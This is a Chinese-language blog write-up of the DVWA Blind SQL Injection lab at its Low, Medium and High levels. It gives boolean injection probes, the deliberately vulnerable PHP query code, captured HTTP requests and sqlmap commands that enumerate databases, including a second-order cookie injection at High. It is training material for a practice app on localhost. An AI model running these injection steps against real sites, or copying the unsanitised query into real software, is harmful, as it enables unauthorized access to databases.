---
layout: post
title: "DVWA Blind SQL Injection"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_SQL_Injection
author: ""
tags: ['DVWA', 'SQL_Injection']
---



# DVWA Blind SQL Injection 
###### tags: `DVWA`




### 盲注，就是向是在問神一樣。

假設我們在猜一個數字 5

你問神說，是大於1嗎，他回答是。

你再問大於10嗎，他說否

於是你說大於5嗎，他說否

於是你說小於5嗎，他說否

於是你說等於5嗎，他說是。


一整個過程要猜出數據庫名長度，假設為dvwa 你要猜長度=4。
猜到你還要猜，第一個字是 abcd....xyz嗎。

就特煩.......



我就不一步步猜到最後密碼了，因為我之前文章寫過，真的sql blind注入特別煩，直接掏sqlmap。





# Low:


先不看code 自己猜一下是哪種類型的注入

```
1' and 1 #
User ID exists in the database.

1' and 0 #
User ID is MISSING from the database.

可以大概知道是字符型

```


code:

果然是字符型。
```php=
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

```


bp抓包 放進 http_request.txt

```http=
GET /vulnerabilities/sqli_blind/?id=1&Submit=Submit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost/vulnerabilities/sqli_blind/?id=&Submit=Submit
Cookie: PHPSESSID=f07dfff7ec2a9fb6f776ea55eba45859; security=low
Upgrade-Insecure-Requests: 1


```


* sqlmap 太舒服了
```
python D:\SQL_map\sqlmap-master\sqlmap.py  -r http_request.txt --batch

順便看一下databases
python D:\SQL_map\sqlmap-master\sqlmap.py  -r http_request.txt --batch --dbs

```




# Medium

這他用post 方式，我們需要抓包，手動分析一下是哪種類型注入。

bp
```http=
POST /vulnerabilities/sqli_blind/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/sqli_blind/
Cookie: PHPSESSID=f07dfff7ec2a9fb6f776ea55eba45859; security=medium
Upgrade-Insecure-Requests: 1

id=1#&Submit=Submit

```



數字型(bool)
```

id=1 and 1#
User ID exists in the database.

id=1 and 0#
User ID is MISSING from the database.

```




好啦，直接不演了

```bash=
python D:\SQL_map\sqlmap-master\sqlmap.py  -r http_request.txt --batch --dbs

```
OK


<br/><br/>




# High

這題稍微不一樣。

bp 先隨便輸入1

他有兩步過程。


第一個 POST id=1
```http=
POST /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/sqli_blind/cookie-input.php
Cookie: PHPSESSID=4e90cfac8263d1fbfd39d824073afd4d; security=high;
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit
```



第二個 cookie id=1
```http=
GET /vulnerabilities/sqli_blind/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/security.php
Connection: close
Cookie: id=1; PHPSESSID=f07dfff7ec2a9fb6f776ea55eba45859; security=high
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

另外他輸入頁面跟輸出不是同一個


* 用第一個post包 加上 Cookie: id=1;
因為輸入在這個包，sql map 沒那聰明，我們分析出最後是靠cookie來注入。

http_request.txt
```http=
POST /vulnerabilities/sqli_blind/cookie-input.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://localhost
Connection: close
Referer: http://localhost/vulnerabilities/sqli_blind/cookie-input.php
Cookie: id=1; PHPSESSID=4e90cfac8263d1fbfd39d824073afd4d; security=high;
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit
```


最後
```
python D:\SQL_map\sqlmap-master\sqlmap.py -r "http_request.txt"  --second-url "http://localhost/vulnerabilities/sqli_blind/" --level 2 --batch --dbs

```

當然我這種改包的方式，可能容易誤導，所以還是可以乖乖的用命令行  一個個參數加 最後加上cookie 可能會容易看一些。



# Impossilbe:

加上PDO 無法注入。


